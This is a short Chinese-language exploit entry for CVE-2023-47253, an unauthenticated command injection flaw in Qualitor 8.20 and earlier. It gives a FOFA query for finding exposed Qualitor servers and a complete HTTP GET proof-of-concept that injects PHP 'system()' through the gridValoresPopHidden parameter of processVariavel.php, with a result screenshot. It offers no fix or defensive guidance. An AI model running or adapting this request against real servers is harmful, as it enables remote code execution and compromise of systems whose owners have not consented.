# Qualitor系统接口processVariavel.php未授权命令注入漏洞(CVE-2023-47253)

Qualitor 8.20及之前版本存在命令注入漏洞,远程攻击者可利用该漏洞通过PHP代码执行任意代码。

## fofa

```javascript
app="Qualitor-Web"
```

## poc

```javascript
GET /html/ad/adpesquisasql/request/processVariavel.php?gridValoresPopHidden=echo%20system("dir"); HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept: application/json, text/javascript, */*; q=0.01
Accept-Encoding: gzip, deflate
Connection: keep-alive
```

![image-20240927201132596](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202409272011669.png)